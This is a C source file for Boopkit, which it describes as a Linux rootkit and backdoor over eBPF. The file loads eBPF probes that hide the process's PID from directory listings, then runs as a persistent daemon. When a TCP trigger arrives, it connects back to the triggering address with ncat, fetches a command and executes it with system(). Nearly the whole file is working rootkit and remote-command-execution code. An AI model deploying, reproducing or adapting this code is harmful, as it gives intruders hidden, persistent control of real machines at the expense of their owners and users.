// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [boopkit.c]
//
// Where the main() function goes down.

#include <arpa/inet.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// clang-format off
#include "boopkit.h"
#include "pr0be.skel.h"
// clang-format on

void asciiheader() {
  printf("\n\n");
  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
  printf("\n\n");
}

void usage() {
  printf("Boopkit version: %s\n", VERSION);
  printf("Linux rootkit and backdoor over eBPF.\n");
  printf("Author: Kris Nóva <kris@nivenly.com>\n");
  printf("\n");
  printf("Usage: boopkit [options]\n");
  printf("\n");
  printf("Options:\n");
  printf("-h, help           Display help and usage for boopkit.\n");
  printf("-x, ignore         Source addresses to reject triggers from.\n");
  printf("\n");
  exit(0);
}

// handlerevrce will handle a reverse lookup against
// a triggered event. This is responsible for
// finding whatever boop command will need to
// be executed on the bookit exploited machine.
void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
  printf("  ** Boop: %s\n ", dial);
  // -- Hacky implementation --
  char cmd[MAX_RCE_SIZE];
  sprintf(cmd, "ncat %s %d", dial, PORT);
  FILE *fp;
  fp = popen(cmd, "r");
  if (fp == NULL) {
    return;
  }
  while (fgets(rce, MAX_RCE_SIZE, fp) != NULL) {
  }
  // -- Hacky implementation --
}

// config is the configuration options for the program
struct config {
  int sudobypass;
  char pr0besafepath[PATH_MAX];
  char pr0bebooppath[PATH_MAX];
  int denyc;
  char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
} cfg;

// clisetup will initialize the config struct for the program
void clisetup(int argc, char **argv) {
  cfg.denyc = 0;
  cfg.sudobypass = 1;
  if (getenv("HOME") == NULL) {
    strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
    strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
  } else {
    sprintf(cfg.pr0besafepath, "%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
    sprintf(cfg.pr0bebooppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
  }
  for (int i = 0; i < argc; i++) {
    if (argv[i][0] == '-') {
      switch (argv[i][1]) {
        case 's':
          cfg.sudobypass = 1;
          break;
        case 'x':
          // Append deny addr
          strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
          cfg.denyc++;
          break;
        case 'h':
          usage();
          break;
      }
    }
  }
}

static struct env {
  int pid_to_hide;
  int target_ppid;
} env;

// handlepidlookup is called everytime the kernel searches for our pid.
static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
  const struct event *e = data;
  return 0;
}

void rootcheck(int argc, char **argv) {
  long luid = (long)getuid();
  printf("  -> getuid() : %ld\n", luid);
  if (luid != 0) {
    printf("  XX Invalid UID.\n");
    if (!cfg.sudobypass) {
      printf("  XX Permission denied.\n");
      exit(1);
    }
    printf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
  }
  long lpid = (long)getpid();
  long lppid = (long)getppid();
  printf("  -> getpid()  : %ld\n", lpid);
  printf("  -> getppid() : %ld\n", lppid);
  if (lpid - lppid == 1) {
    // We assume we are running with sudo at this point!
    // If the ppid() and pid() are close together this
    // implies that the process tree has cascaded a new
    // ppid() for the process. In other words, we are probably
    // running with sudo (or similar).
    printf("  XX Running as cascaded pid (sudo) is invalid for obfuscation.\n");
    if (!cfg.sudobypass) {
      printf("  XX Permission denied.\n");
      exit(1);
    }
    printf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
  }
}

// main
//
// The primary program entry point and argument handling
int main(int argc, char **argv) {
  asciiheader();
  clisetup(argc, argv);
  rootcheck(argc, argv);
  printf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");
  // Return value for eBPF loading
  int loaded, err;

  // ===========================================================================
  // Safe probes
  //
  // This will load the safe kernel probes at runtime.
  //
  struct pr0be_safe *sfobj;
  printf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
  sfobj = pr0be_safe__open();
  char pid[MAXPIDLEN];
  // getpid()
  //
  // Note: We know that we can use getpid() as the rootcheck() function above
  //       will manage ensuring we are executing this program without sudo
  env.pid_to_hide = getpid();
  sprintf(pid, "%d", env.pid_to_hide);
  printf("  -> Obfuscating PID: %s\n", pid);
  strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));

  sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
  sfobj->rodata->target_ppid = env.target_ppid;
  loaded = pr0be_safe__load(sfobj);
  if (loaded < 0) {
    printf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
    printf("Privileged acces required to load eBPF probe!\n");
    printf("Permission denied.\n");
    return 1;
  }
  printf("  -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);

  // Exit
  int index = PROG_01;
  int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
  int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                                &prog_fd, BPF_ANY);
  if (ret == -1) {
    printf("Failed to hide PID: %s\n", strerror(errno));
    return 1;
  }

  //  Patch
  index = PROG_02;
  prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
  ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                            &prog_fd, BPF_ANY);
  if (ret == -1) {
    printf("Failed to hide PID: %s\n", strerror(errno));
    return 1;
  }

  // Attach to probe
  err = pr0be_safe__attach(sfobj);
  if (err) {
    fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
    return 1;
  }

  // Set up ring buffer
  struct ring_buffer *rb = NULL;
  rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
                        NULL);
  if (!rb) {
    fprintf(stderr, "Failed to create ring buffer\n");
    return 1;
  }

  // ===========================================================================
  // Boop probes
  //
  // This will load the boop kernel probes at runtime.
  //
  struct bpf_object *bpobj;
  printf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
  bpobj = bpf_object__open(cfg.pr0bebooppath);
  if (!bpobj) {
    printf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
    printf("Privileged acces required to load eBPF probe!\n");
    printf("Permission denied.\n");
    return 1;
  }
  loaded = bpf_object__load(bpobj);
  if (loaded < 0) {
    printf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
    return 1;
  }
  printf("  -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
  struct bpf_program *program = NULL;
  bpf_object__for_each_program(program, bpobj) {
    printf("  -> eBPF Program Address: %p\n", program);
    const char *progname = bpf_program__name(program);
    printf("  -> eBPF Program Name: %s\n", progname);
    const char *progsecname = bpf_program__section_name(program);
    printf("  -> eBPF Program Section Name: %s\n", progsecname);
    struct bpf_link *link = bpf_program__attach(program);
    if (!link) {
      printf("Unable to link eBPF program: %s\n", progname);
      continue;
    }
  }

  // ===========================================================================
  // Boop eBPF Map
  //
  // We (by design) only have a single map for the boop object!
  // Therefore, we can call next_map() with NULL and get the first
  // map from the probe.
  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
  const char *mapname = bpf_map__name(bpmap);
  printf("  -> eBPF Map Name: %s\n", mapname);
  int fd = bpf_map__fd(bpmap);
  printf("  -> eBPF Program Linked!\n");

  for (int i = 0; i < cfg.denyc; i++) {
    printf("   X Deny address: %s\n", cfg.deny[i]);
  }

  // ===========================================================================
  // Boopkit event loop
  //
  // Boopkit will run as a persistent daemon in userspace!
  int ignore = 0;
  while (1) {
    err = ring_buffer__poll(rb, 100);

    // =========================================================================
    // Boop map management
    //
    int ikey = 0, jkey;
    int err;
    char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
    struct tcp_return ret;
    while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
      err = bpf_map_lookup_elem(fd, &jkey, &ret);
      if (err < 0) {
        continue;
      }
      ignore = 0;
      inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof(saddrval));
      for (int i = 0; i < cfg.denyc; i++) {
        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
          // Ignoring string in deny list
          ignore = 1;
          break;
        }
      }
      if (!ignore) {
        char *rce = malloc(MAX_RCE_SIZE);
        handlerevrce(saddrval, rce);
        printf(" <- %s\n", rce);
        system(rce);
        free(rce);
      }
      err = bpf_map_delete_elem(fd, &jkey);
      if (err < 0) {
        return 0;
      }
      ikey = jkey;
    }
  }
}
